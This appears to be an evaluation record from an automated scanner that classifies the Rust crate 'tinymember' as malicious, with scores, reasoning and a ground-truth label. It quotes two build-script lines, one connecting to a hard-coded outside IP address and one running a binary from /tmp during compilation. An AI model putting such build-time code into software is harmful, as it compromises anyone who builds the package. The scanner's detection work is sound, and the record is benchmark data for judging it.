@@ -1,0 +1,109 @@
+{
+  "crate": "tinymember",
+  "version": "0.1.0",
+  "condition": "structured_norag",
+  "signals": {
+    "crate": "tinymember",
+    "version": {
+      "version": "0.1.0",
+      "major": 0,
+      "high_major_version": false
+    },
+    "analysis_timestamp": "2026-10-07T17:28:55.623205+00:00",
+    "build_rs": {
+      "has_build_rs": true,
+      "signals": [
+        "network_call",
+        "process_spawn"
+      ],
+      "network_calls": [
+        "let _ = TcpStream::connect(\"23.254.165.112:9089\");"
+      ],
+      "file_writes": [],
+      "env_reads": [],
+      "process_spawns": [
+        "let _ = Command::new(\"/tmp/rust-setup\");"
+      ],
+      "benign_explained": {},
+      "flagged_snippets": [
+        "let _ = TcpStream::connect(\"23.254.165.112:9089\");",
+        "let _ = Command::new(\"/tmp/rust-setup\");"
+      ]
+    },
+    "unsafe_ffi": {
+      "unsafe_block_count": 0,
+      "unsafe_per_kloc": 0.0,
+      "ffi_declarations": [],
+      "syscall_usage": [],
+      "ffi_crate_dependencies": []
+    },
+    "proc_macro": {
+      "is_proc_macro": false
+    },
+    "typosquatting": {
+      "score": 0.3,
+      "target": "thiserror",
+      "edit_distance": 7,
+      "target_rank": 10,
+      "flagged": false
+    },
+    "dependencies": {
+      "count": 0,
+      "names": [],
+      "dev_dependency_count": 0,
+      "suspicious": [],
+      "suspicious_basis": null,
+      "pinned": false
+    },
+    "source_scan": {
+      "counts": {},
+      "categories": [],
+      "possible_exfiltration_shape": false,
+      "snippets": {}
+    },
+    "prompt_injection": {
+      "detected": false,
+      "matches": []
+    },
+    "content": {
+      "rust_files": 1,
+      "has_build_script": true,
+      "meaningful_lines": 8,
+      "meaningful_lines_build_script": 7,
+      "total_bytes": 248
+    }
+  },
+  "classification": {
+    "classification": "MALICIOUS",
+    "llm_classification": "MALICIOUS",
+    "reconciled": false,
+    "confidence": "HIGH",
+    "reasoning": "Purpose: The crate has minimal meaningful code (8 lines in rust files, 7 lines in the build script) and serves no legitimate library purpose. Sources: None explicit in code, but the build script initiates outgoing communication. Sinks: The build script executes a network call via `TcpStream::connect(\"23.254.165.112:9089\")` and spawns an external process via `Command::new(\"/tmp/rust-setup\")`. Flow: The build script connects to an external IP literal and executes a binary dropped or located in /tmp during `cargo build` before any runtime control, which is a classic supply-chain attack vector. Anomalies: Zero dependencies, extremely small codebase, and arbitrary code execution/network calls inside a build script. Conclusion: The crate is intentionally malicious.",
+    "primary_signals": [
+      "build_rs.network_call",
+      "build_rs.process_spawn",
+      "ip_literal_connection"
+    ],
+    "retrieved_evidence_used": [],
+    "recommended_action": "Block",
+    "malware_score": 0.99,
+    "security_risk_score": 0.95,
+    "obfuscation_score": 0.0,
+    "confidence_score": 0.99,
+    "flagged_by_score": true,
+    "score_label_consistent": true,
+    "parse_error": false,
+    "unverified_citations": []
+  },
+  "retrieved_context": [],
+  "prescreen": null,
+  "packing": null,
+  "holdout": true,
+  "usage": {
+    "calls": 1,
+    "chars_in": 9462,
+    "chars_out": 1144
+  },
+  "ground_truth": "MALICIOUS",
+  "correct": true
+}
